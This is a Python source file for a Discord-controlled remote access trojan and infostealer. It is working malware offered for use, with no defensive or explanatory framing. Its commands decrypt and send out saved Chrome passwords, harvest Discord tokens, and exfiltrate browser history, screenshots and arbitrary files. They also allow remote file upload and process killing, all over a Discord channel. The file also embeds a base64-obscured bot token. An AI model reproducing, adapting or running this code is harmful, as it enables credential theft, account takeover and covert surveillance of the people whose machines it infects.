import discord
from discord.ext import commands
import requests
import socket
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES  # type: ignore
import shutil
import tempfile
import asyncio
from PIL import ImageGrab
import io
import psutil  # type: ignore
import subprocess
import platform
import win32gui
from datetime import date

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print("logged in \isudg")

@bot.command()
async def ping(ctx):
    await ctx.send(f"Pong! Latency is: {round(bot.latency * 1000)} ms")

@bot.command()
async def clear(ctx, amt):
    await ctx.channel.purge(limit=int(amt) + 1)

def get_chrome_history():
    if platform.system() == 'Windows':
        history_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\History')
    elif platform.system() == 'Darwin':
        history_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
    else:
        history_path = os.path.expanduser('~/.config/google-chrome/Default/History')

    connection = sqlite3.connect(history_path)
    cursor = connection.cursor()

    cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC')

    history_items = cursor.fetchall()

    history_data = ""
    for item in history_items:
        url, title, visit_count, last_visit_time = item
        history_data += f"Title: {title}\nURL: {url}\nVisits: {visit_count}\n\n"

    connection.close()

    return history_data if history_data else "No history found."

def split_message(message, max_length=400):
    return [message[i:i + max_length] for i in range(0, len(message), max_length)]

def has_window(proc):
    try:
        handle = win32gui.GetForegroundWindow()
        return proc.pid == win32gui.GetWindowThreadProcessId(handle)[1]
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        return False

@bot.command()
async def grab(ctx, info, description='Grabs info on computer'):
    if info == "passwords":
        CHR0ME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
        CHR0ME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

        try:
            def g3t_s3cr3t_k3y():
                try:
                    #(1) Get secretkey from chrome local state
                    with open(CHR0ME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    #Remove suffix DPAPI
                    secret_key = secret_key[5:] 
                    secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
                    return secret_key
                except Exception as e:
                    print("%s"%str(e))
                    print("[ERR] Chrome secretkey cannot be found")
                    return None

            def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)

            def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)

            def decrypt_password(ciphertext, secret_key):
                try:
                    #(3-a) Initialisation vector for AES decryption
                    initialisation_vector = ciphertext[3:15]
                    #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
                    #Encrypted password is 192 bits
                    encrypted_password = ciphertext[15:-16]
                    #(4) Build the cipher to decrypt the ciphertext
                    cipher = generate_cipher(secret_key, initialisation_vector)
                    decrypted_pass = decrypt_payload(cipher, encrypted_password)
                    decrypted_pass = decrypted_pass.decode()  
                    return decrypted_pass
                except Exception as e:
                    print("%s"%str(e))
                    print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
                    return ""

            def get_db_connection(chrome_path_login_db):
                try:
                    print(chrome_path_login_db)
                    shutil.copy2(chrome_path_login_db, "Loginvault.db") 
                    return sqlite3.connect("Loginvault.db")
                except Exception as e:
                    print("%s"%str(e))
                    print("[ERR] Chrome database cannot be found")
                    return None

            #(1) Get secret key
            secret_key = g3t_s3cr3t_k3y()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHR0ME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            info_list = []  # Collect data to be sent in a single embed
            for folder in folders:
                #(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHR0ME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
                            #(4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            info_list.append(f'URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n')

                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")

            temp_file_path = os.path.join(tempfile.gettempdir(), 'grabbed_data.txt')
            with open(temp_file_path, 'w') as temp_file:
                temp_file.write('\n'.join(info_list))

            with open(temp_file_path, 'r') as temp_file:
                info_str = temp_file.read()

            embed = discord.Embed(
                title='Saved Chrome Passwords',
                description=info_str,
                color=discord.Color.blue() 
            )

            await ctx.send(embed=embed)
            os.remove(temp_file_path)
            
        except Exception as e:
            print("[ERR] %s"%str(e))
        os.remove(temp_file_path)

    elif info == "discord":
        # Logic for grabbing Discord tokens
        path = os.path.join(os.environ['APPDATA'], 'Discord', 'Local Storage', 'leveldb')
        token_list = []

        # Loop through each file in the specified directory
        for file_name in os.listdir(path):
            if file_name.endswith('.log') or file_name.endswith('.ldb'):
                with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
                    for line in f:
                        # Look for lines that contain the token format
                        if 'dQw4w9WgXcQ:' in line:  # A pattern indicative of a Discord token
                            token = line.split('dQw4w9WgXcQ:')[1].strip()
                            token_list.append(token)

        # Prepare the embed to send the tokens
        if token_list:
            embed = discord.Embed(
                title='Discord Tokens',
                description="\n".join(token_list),
                color=discord.Color.green()
            )
        else:
            embed = discord.Embed(
                title='Discord Tokens',
                description="No tokens found.",
                color=discord.Color.red()
            )

        await ctx.send(embed=embed)

    if info == "history":
        history = get_chrome_history()
        temp_file_path = os.path.join(os.path.expanduser('~'), 'history.txt')
        
        with open(temp_file_path, 'w', encoding='utf-8') as file:
            file.write(history)

        if len(history) < 2000:
            embed = discord.Embed(
                title="Browser History",
                description=history,
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send(file=discord.File(temp_file_path))

        os.remove(temp_file_path)

@bot.command()
async def show(ctx, whattoshow):
    if whattoshow == "processes":
        processes = []
        
        for proc in psutil.process_iter(['pid', 'name']):
            if has_window(proc):
                try:
                    process_name = proc.info['name']
                    processes.append(process_name)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        
        process_list = "\n".join(processes[:100]) if processes else "No processes found."
        
        await ctx.send(f"```User-Visible Processes (Names Only):\n{process_list}```")

@bot.command()
async def kill(ctx, task: str):
    command = ["taskkill", "/IM", task]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            await ctx.send(f"Successfully killed {task}")
        else:
            await ctx.send(f"Failed to kill {task}: {result.stderr.strip()}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def download(ctx, file_path):
    try:
        with open(file_path, 'rb') as file:
            await ctx.send(file=discord.File(file, os.path.basename(file_path)))
    except FileNotFoundError:
        await ctx.send("File not found.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def upload(ctx, num_of_files: int):
    await ctx.send("Please send the files you wish to upload.")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and len(m.attachments) > 0

    messages = await bot.wait_for('message', check=check)

    for attachment in messages.attachments:
        file_bytes = await attachment.read()
        with open(attachment.filename, 'wb') as f:
            f.write(file_bytes)
        await ctx.send(f"Uploaded: {attachment.filename}")

@bot.command(aliases=['screenshot'])
async def ss(ctx):
    screenshot = ImageGrab.grab()
    byte_io = io.BytesIO()
    screenshot.save(byte_io, format='PNG')
    byte_io.seek(0)

    await ctx.send(file=discord.File(byte_io, 'screenshot.png'))

@bot.command()
async def ls(ctx):
    files = os.listdir('.')
    await ctx.send(f"```{files}```")

token = b'TVRFM05qQTJOekF6TkRjME5EZzROVEkwT0EuR2RQTm9KLlZoTVNBYTR1eElLNDAyZTJ3TGUydWNUcVZaRTAtVnppMXJKU1hr'
d_token = base64.b64decode(token)

bot.run(d_token.decode())
